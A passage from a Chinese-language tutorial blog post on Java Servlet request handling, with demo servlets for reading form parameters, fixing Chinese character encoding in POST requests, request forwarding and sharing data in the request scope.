class="string">"username"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"post"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"username"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//get获取请求参数</span></span><br><span class="line"><span class="comment">//        String username = request.getParameter("username");</span></span><br><span class="line"><span class="comment">//        System.out.println("get");</span></span><br><span class="line"><span class="comment">//        System.out.println("username");</span></span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="getParameterValues"><a href="#getParameterValues" class="headerlink" title="getParameterValues"></a>getParameterValues</h4><p>刚才提到这个适用于复选框</p>
<p>修改regist2.html<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/hello/request6"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> <span class="attr">value</span>=<span class="string">"game"</span>&gt;</span>游戏</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> <span class="attr">value</span>=<span class="string">"study"</span>&gt;</span>学习</span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注册"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>同时修改Servlet<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo6"</span>,urlPatterns = <span class="string">"/request6"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo6</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//post获取请求参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据参数名称获取参数值</span></span><br><span class="line">        <span class="type">String</span> username = request.getParameter(<span class="string">"username"</span>);</span><br><span class="line"><span class="comment">//        System.out.println("post");</span></span><br><span class="line"><span class="comment">//        System.out.println("username");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据参数名称获取参数值的数组</span></span><br><span class="line">        <span class="type">String</span>[] hobbies = request.getParameterValues(<span class="string">"hobby"</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">String</span> hobby:hobbies)&#123;</span><br><span class="line">            <span class="type">System</span>.out.println(hobby);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//get获取请求参数</span></span><br><span class="line"><span class="comment">//        String username = request.getParameter("username");</span></span><br><span class="line"><span class="comment">//        System.out.println("get");</span></span><br><span class="line"><span class="comment">//        System.out.println("username");</span></span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>再次访问regist2.html，勾选游戏和学习，点击注册<br>运行结果<br><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">game</span></span><br><span class="line"><span class="attribute">study</span></span><br></pre></td></tr></table></figure></p>
<h4 id="getParameterNames"><a href="#getParameterNames" class="headerlink" title="getParameterNames"></a>getParameterNames</h4><p>修改Servlet<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package Request;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Enumeration;</span><br><span class="line"></span><br><span class="line">@<span class="constructor">WebServlet(<span class="params">name</span> = <span class="string">"RequestDemo6"</span>,<span class="params">urlPatterns</span> = <span class="string">"/request6"</span>)</span></span><br><span class="line">public <span class="keyword">class</span> RequestDemo6 extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Post(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//post获取请求参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据参数名称获取参数值</span></span><br><span class="line">        String username = request.get<span class="constructor">Parameter(<span class="string">"username"</span>)</span>;</span><br><span class="line"><span class="comment">//        System.out.println("post");</span></span><br><span class="line"><span class="comment">//        System.out.println("username");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//根据参数名称获取参数值的数组</span></span><br><span class="line">        String<span class="literal">[]</span> hobbies = request.get<span class="constructor">ParameterValues(<span class="string">"hobby"</span>)</span>;</span><br><span class="line"><span class="comment">//        for(String hobby:hobbies)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(hobby);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有请求的参数名称</span></span><br><span class="line">        Enumeration&lt;String&gt; parameterNames = request.get<span class="constructor">ParameterNames()</span>;</span><br><span class="line">        <span class="keyword">while</span> (parameterNames.has<span class="constructor">MoreElements()</span>)&#123;</span><br><span class="line">            String name = parameterNames.next<span class="constructor">Element()</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(name);</span><br><span class="line">            String value = request.get<span class="constructor">Parameter(<span class="params">name</span>)</span>;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(value);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"--------------------------------"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Get(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//get获取请求参数</span></span><br><span class="line"><span class="comment">//        String username = request.getParameter("username");</span></span><br><span class="line"><span class="comment">//        System.out.println("get");</span></span><br><span class="line"><span class="comment">//        System.out.println("username");</span></span><br><span class="line">        this.<span class="keyword">do</span><span class="constructor">Post(<span class="params">request</span>,<span class="params">response</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>访问regist2.html</p>
<p>运行结果<br><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">username</span><br><span class="line">51nd0re1</span><br><span class="line">--------------------------------</span><br><span class="line">password</span><br><span class="line">123</span><br><span class="line">--------------------------------</span><br><span class="line">hobby</span><br><span class="line">game</span><br><span class="line">--------------------------------</span><br></pre></td></tr></table></figure></p>
<p>会发现一个问题，hobby明明勾选了两个但是却只输出了一个，这是因为getParameter是String类型，而不是数组</p>
<h4 id="getParameterMap"><a href="#getParameterMap" class="headerlink" title="getParameterMap"></a>getParameterMap</h4><p>修改Servlet<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">package Request;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line">@WebServlet(<span class="type">name</span> = "RequestDemo6",urlPatterns = "/request6")</span><br><span class="line"><span class="built_in">public</span> <span class="keyword">class</span> RequestDemo6 extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected <span class="type">void</span> doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        //post获取请求参数</span><br><span class="line"></span><br><span class="line">        //根据参数名称获取参数值</span><br><span class="line">        String username = request.getParameter("username");</span><br><span class="line">//        <span class="keyword">System</span>.<span class="keyword">out</span>.println("post");</span><br><span class="line">//        <span class="keyword">System</span>.<span class="keyword">out</span>.println("username");</span><br><span class="line"></span><br><span class="line">        //根据参数名称获取参数值的数组</span><br><span class="line">        String[] hobbies = request.getParameterValues("hobby");</span><br><span class="line">//        <span class="keyword">for</span>(String hobby:hobbies)&#123;</span><br><span class="line">//            <span class="keyword">System</span>.<span class="keyword">out</span>.println(hobby);</span><br><span class="line">//        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //获取所有请求的参数名称</span><br><span class="line">        Enumeration&lt;String&gt; parameterNames = request.getParameterNames();</span><br><span class="line">//        <span class="keyword">while</span> (parameterNames.hasMoreElements())&#123;</span><br><span class="line">//            String <span class="type">name</span> = parameterNames.nextElement();</span><br><span class="line">//            <span class="keyword">System</span>.<span class="keyword">out</span>.println(<span class="type">name</span>);</span><br><span class="line">//            String <span class="keyword">value</span> = request.getParameter(<span class="type">name</span>);</span><br><span class="line">//            <span class="keyword">System</span>.<span class="keyword">out</span>.println(<span class="keyword">value</span>);</span><br><span class="line">//            <span class="keyword">System</span>.<span class="keyword">out</span>.println("--------------------------------");</span><br><span class="line">//        &#125;</span><br><span class="line"></span><br><span class="line">        //获取所有参数的map集合</span><br><span class="line">        Map&lt;String,String[]&gt; parameterMap = request.getParameterMap();</span><br><span class="line">        //循环</span><br><span class="line">        <span class="keyword">Set</span>&lt;String&gt; keySet = parameterMap.keySet();</span><br><span class="line">        <span class="keyword">for</span>(String <span class="type">name</span> : keySet)&#123;</span><br><span class="line">            //根据key获取值</span><br><span class="line">            String[] <span class="keyword">values</span> = parameterMap.<span class="keyword">get</span>(<span class="type">name</span>);</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println(<span class="type">name</span>);</span><br><span class="line">            <span class="keyword">for</span>(String <span class="keyword">value</span> : <span class="keyword">values</span>)&#123;</span><br><span class="line">                <span class="keyword">System</span>.<span class="keyword">out</span>.println(<span class="keyword">value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">System</span>.<span class="keyword">out</span>.println("--------------------");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected <span class="type">void</span> doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;</span><br><span class="line">        //<span class="keyword">get</span>获取请求参数</span><br><span class="line">//        String username = request.getParameter("username");</span><br><span class="line">//        <span class="keyword">System</span>.<span class="keyword">out</span>.println("get");</span><br><span class="line">//        <span class="keyword">System</span>.<span class="keyword">out</span>.println("username");</span><br><span class="line">        this.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">username</span><br><span class="line">51nd0re1</span><br><span class="line">--------------------</span><br><span class="line">password</span><br><span class="line">123</span><br><span class="line">--------------------</span><br><span class="line">hobby</span><br><span class="line">game</span><br><span class="line">study</span><br><span class="line">--------------------</span><br></pre></td></tr></table></figure><br>这里看到已经获取到了game和study，这样就解决了上一个获取不完整的问题</p>
<h2 id="中文乱码问题"><a href="#中文乱码问题" class="headerlink" title="中文乱码问题"></a>中文乱码问题</h2><p>get方式  tomcat8已经将中文乱码问题解决了</p>
<p>post方式解决办法</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo7"</span>,urlPatterns = <span class="string">"/request7"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo7</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.设置流的编码</span></span><br><span class="line">        request.setCharacterEncoding(<span class="string">"utf-8"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取请求参数</span></span><br><span class="line">        <span class="type">String</span> username = request.getParameter(<span class="string">"username"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置为utf-8即可</p>
<h2 id="请求转发"><a href="#请求转发" class="headerlink" title="请求转发"></a>请求转发</h2><p>一种在服务器内部的资源跳转方式</p>
<ol>
<li><p>通过request对象获取请求转发器对象：<code>RequestDispatcher getRequestDispatcher(String path)</code></p>
</li>
<li><p>使用RequestDispatcher对象来进行转发</p>
</li>
</ol>
<h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>RequestDemo8<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">RequestDispatcher</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo8"</span>,urlPatterns = <span class="string">"/request8"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo8</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"demo8被访问了----"</span>);</span><br><span class="line">        <span class="comment">//转发到demo9资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        RequestDispatcher requestDispatcher = request.getRequestDispatcher("/request9");</span></span><br><span class="line"><span class="comment">//        requestDispatcher.forward(request, response);</span></span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/request9"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>RequestDemo9<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo9"</span>,urlPatterns = <span class="string">"/request9"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo9</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"demo9被访问了----"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>访问request8<br>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">demo8被访问了<span class="comment">----</span></span><br><span class="line">demo9被访问了<span class="comment">----</span></span><br></pre></td></tr></table></figure></p>
<p>特点</p>
<ol>
<li>浏览器地址栏路径不发生变化</li>
<li>只能转发到当前的服务器内部资源中</li>
<li>转发是一次请求</li>
</ol>
<h2 id="共享数据"><a href="#共享数据" class="headerlink" title="共享数据"></a>共享数据</h2><ul>
<li><p>域对象：一个有作用范围的对象，可以在范围内共享数据</p>
</li>
<li><p>request域：代表一次请求的范围，一般用于请求转发的多个资源中共享数据</p>
</li>
</ul>
<p>方法：</p>
<ol>
<li><p>setAttribute(String name,Object obj)：存储数据</p>
</li>
<li><p>Object getAttitude(String name):通过键获取值</p>
</li>
<li><p>removeAttribute(String name):通过键移除键值对</p>
</li>
</ol>
<h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>修改request8<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">RequestDispatcher</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo8"</span>,urlPatterns = <span class="string">"/request8"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo8</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"demo8被访问了----"</span>);</span><br><span class="line">        <span class="comment">//转发到demo9资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        RequestDispatcher requestDispatcher = request.getRequestDispatcher("/request9");</span></span><br><span class="line"><span class="comment">//        requestDispatcher.forward(request, response);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//存储数据到request域中</span></span><br><span class="line">        request.setAttribute(<span class="string">"msg"</span>,<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">        request.getRequestDispatcher(<span class="string">"/request9"</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>在转发之前将数据存储到request域中</p>
<p>修改request9<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo9"</span>,urlPatterns = <span class="string">"/request9"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo9</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        <span class="type">Object</span> msg = request.getAttribute(<span class="string">"msg"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(msg);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"demo9被访问了----"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>访问request8<br>运行结果<br><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">demo8被访问了<span class="comment">----</span></span><br><span class="line">hello</span><br><span class="line">demo9被访问了<span class="comment">----</span></span><br></pre></td></tr></table></figure></p>
<p>这里可以知道，只有在转发的情况下才可以进行数据共享</p>
<h2 id="获取ServletContext"><a href="#获取ServletContext" class="headerlink" title="获取ServletContext"></a>获取ServletContext</h2><figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">ServletContext</span> <span class="function"><span class="title">getServletContext</span>()</span></span><br></pre></td></tr></table></figure>
<p>演示<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletContext</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo10"</span>,urlPatterns = <span class="string">"/request10"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo10</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="type">ServletContext</span> servletContext = 